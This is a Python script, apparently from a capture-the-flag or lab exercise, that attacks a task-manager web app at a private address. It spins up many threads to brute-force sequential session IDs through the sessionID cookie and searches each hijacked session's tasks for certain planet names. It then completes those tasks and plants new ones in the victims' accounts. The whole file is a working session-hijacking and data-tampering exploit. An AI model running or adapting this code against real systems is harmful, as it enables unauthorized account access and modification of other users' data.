import requests
import threading
import random
import time

domain = 'http://172.20.20.15:5000'

proxies = {
    "http": "http://127.0.0.1:3128",
    "https": "http://127.0.0.1:3128",
}

def check_task(session_id, phrase):
    url = f'{domain}/tasks'
    headers = {'Cookie': f'sessionID={session_id}'}
    response = requests.get(url, headers=headers, proxies=proxies)
    respond = []
    for elem in phrase:
        if elem in response.text.lower():
            respond.append(elem)
    if respond == [] or respond is None:
        return None
    else:
        return respond

def findTask(phrase, end, start=1, results=None, checked = None):
    if end < start:
        raise ValueError("End must be greater than or equal to start")
    id = start
    response = None
    while response is None and id < end:
        print(f"[Thread {start}-{end-1}] Checking ID: {id}")
        try:
            response = check_task(id, phrase)
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        if response is not None:
            if checked is None or id not in checked:
                print(f"[Thread {start}-{end-1}] Found phrase in ID: {id}")
                if results is not None:
                    results.append([id,] + response)
                    print(f"returning {results}")
        id += 1
    # print(f"[Thread {start}-{end-1}] Finished without finding phrase.")

def compleate(session_id, planet):
    url = f'{domain}/tasks?completed=false'
    headers = {'Cookie': f'sessionID={session_id}'}
    response = requests.get(url, headers=headers, proxies=proxies)
    try:
        tasks = response.json().get('tasks', [])
    except Exception:
        return None

    for task in tasks:
        description = task.get('description', '')
        if any(elem in planet for elem in description.lower()):
            taskid = task.get('taskid', '')
            url = f'{domain}/task'
            headers = {
                'Content-Type': 'application/json'
            }
            data = {"taskid": f'{taskid}'}
            response = requests.post(url, json=data, headers=headers, allow_redirects=False)
            if response.status_code == 200:
                return "Done"
            else:
                return response.text
            
def create_task(session_id, task_data):
    url = f'{domain}/tasks'
    headers = {'Cookie': f'sessionID={session_id}'}
    data = {'title': task_data['title'], 'description': task_data['description'], 'dueDate': (int((int(time.time() * 100) + ((random.randint(0, 400) * 8640000)))))}
    response = requests.put(url, headers=headers, json=data, allow_redirects=False, proxies=proxies)
    if response.status_code in [201, 200]:
        return True
    else:
        return False


def multThreadedFindTask(phrase, max_id=1000, batch_size=20, checked = None):
    threads = []
    results = []
    for start in range(1, max_id + 1, batch_size):
        end = min(start + batch_size, max_id + 1)
        thread = threading.Thread(
            target=findTask,
            args=(phrase, end, start, results, checked)
        )
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    return results


planets = ['eadu', 'kashyyyk', 'geonosis']
planets = [planet.lower() for planet in planets]
save = ['dagobah', 'utapau', 'malastare', 'nal hutta', 'rodia', 'sorgan', 'umbara', 'dxun', 'onderon', 'wayland', 'bakura', 'corellia', 'bothawui', 'tynna', 'socorro', 'ansion', 'eriadu', 'centares', 'balmorra', 'druckenwell', 'esmara', 'falleen', 'haruun kal', 'talravin', 'talus', 'trammell', 'alzoc iii', 'chandrila', 'concord dawn', 'myrkr', 'bracca', 'agamar', 'trask', 'zonama sekot', 'thyferra', 'mon cala', 'sylvar', 'denon', 'pantora', 'zeffo', 'tund', 'byblos']
print("What phrase do you want to search for?")


found = multThreadedFindTask(planets)
print(found)
print(type(found))
for planet in found:
    for i in planet:
        if type(i) == type(""):
            print(i)
            print(type(i))
            print(planet[0])
            compleate(planet[0], i)
            
            create_task(planet[0], {
                'title': random.choice(save),
                'description': random.choice(save)
            })


print("Done")